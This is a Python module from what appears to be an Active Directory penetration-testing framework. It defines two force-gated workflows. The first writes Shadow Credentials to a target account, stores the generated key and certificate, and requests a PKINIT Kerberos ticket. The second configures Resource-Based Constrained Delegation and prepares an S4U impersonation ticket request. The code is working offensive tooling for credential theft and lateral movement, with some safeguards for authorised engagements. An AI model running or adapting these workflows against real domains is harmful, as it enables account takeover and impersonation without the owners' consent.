"""Force-gated wrappers that join existing evidence and ticket capabilities."""

from __future__ import annotations

import json
from typing import Any

from adaf_attack.capabilities.pkinit_auth import PkinitAuth
from adaf_attack.capabilities.rbcd import Rbcd
from adaf_attack.capabilities.shadow_creds import ShadowCreds
from adaf_attack.core.graph import AttackGraph
from adaf_attack.core.registry import register_capability
from adaf_attack.core.session import Session
from adaf_attack.core.target import Target


@register_capability(id="shadow-pkinit-workflow", summary="Write Shadow Credential then request PKINIT TGT (requires --force)", destructive=True, category="credential-access", tags=("shadow-credentials", "pkinit", "workflow"))
class ShadowPkinitWorkflow:
    def run(self, target: Target, session: Session, graph: AttackGraph, *, force: bool = False, include_secrets: bool = False, **kwargs: Any) -> dict[str, Any]:
        sam = kwargs.get("write_target") or kwargs.get("sam")
        if not force or not sam:
            raise RuntimeError("shadow-pkinit-workflow requires --force and --write-target/--sam")
        shadow = ShadowCreds().run(target, session, graph, force=True, write_target=sam)
        write = shadow.get("write_attempt") or {}
        if not write.get("ok"):
            return {"ok": False, "shadow": write, "pkinit": {"skipped": "shadow_write_failed"}}
        vault = session.vault()
        try:
            vault.put("shadow-certificate", "pem", {"key": write.get("key_pem"), "cert": write.get("cert_pem")}, secret=True, metadata={"sam": sam})
        except Exception as exc:  # noqa: BLE001
            session.log("vault.store_skipped", reason=str(exc), workflow="shadow-pkinit")
        pkinit = PkinitAuth().run(target, session, graph, force=True, include_secrets=include_secrets, sam=sam)
        result = {"ok": bool(pkinit.get("ok")), "shadow": write, "pkinit": pkinit}
        session.path("shadow-pkinit-workflow.json").write_text(json.dumps(result, indent=2, default=str) + "\n", encoding="utf-8")
        session.log("shadow-pkinit-workflow.complete", ok=result["ok"], sam=sam)
        return result


@register_capability(id="rbcd-ticket-workflow", summary="Set RBCD then request a service ticket when an approved provider is available", destructive=True, category="lateral-movement", tags=("rbcd", "s4u", "ccache", "workflow"))
class RbcdTicketWorkflow:
    def run(self, target: Target, session: Session, graph: AttackGraph, *, force: bool = False, **kwargs: Any) -> dict[str, Any]:
        set_on, set_from, impersonate = kwargs.get("set_on"), kwargs.get("set_from"), kwargs.get("impersonate")
        if not force or not all((set_on, set_from, impersonate)):
            raise RuntimeError("rbcd-ticket-workflow requires --force, --set-on, --set-from, and --impersonate")
        rbcd = Rbcd().run(target, session, graph, force=True, set_on=set_on, set_from=set_from)
        write = rbcd.get("set_attempt") or {}
        result: dict[str, Any] = {"ok": False, "rbcd": write, "ticket": {"skipped": "rbcd_set_failed"}}
        if write.get("ok"):
            spn = str(kwargs.get("spn") or f"cifs/{str(set_on).rstrip('$')}")
            playbook = session.path("rbcd-s4u.playbook.txt")
            playbook.write_text(f"# Approved S4U request for {impersonate}\n# SPN: {spn}\n# Use the controlled computer credential supplied by the engagement.\n", encoding="utf-8")
            result["ticket"] = {"requested": False, "spn": spn, "playbook": str(playbook), "note": "S4U execution requires a configured provider and controlled-computer credential."}
        session.path("rbcd-ticket-workflow.json").write_text(json.dumps(result, indent=2, default=str) + "\n", encoding="utf-8")
        session.log("rbcd-ticket-workflow.complete", ok=False, set_on=set_on, set_from=set_from)
        return result
